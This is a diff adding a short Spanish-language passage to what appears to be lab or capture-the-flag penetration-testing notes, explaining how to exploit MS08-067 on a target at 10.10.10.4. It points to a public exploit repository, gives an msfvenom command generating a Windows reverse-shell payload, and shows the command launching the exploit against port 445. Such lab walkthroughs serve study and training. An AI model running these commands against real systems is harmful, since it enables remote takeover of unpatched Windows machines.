@@ -65,3 +65,16 @@ python2.7 send_and_execute.py 10.10.10.4 rev_shell.exe
 ```
 #### MS08-67
 
+Utilizaremos el siguiente script para la explotación
+```
+https://github.com/andyacer/ms08_067
+```
+Generamos el payload necesario para la reverse shell
+```
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
+```
+Sustituimos este en la parte correspondiente del exploit`y lo lanzamos
+```
+python ms08_067_2018.py 10.10.10.4 6 445
+```
+Y ya estaría
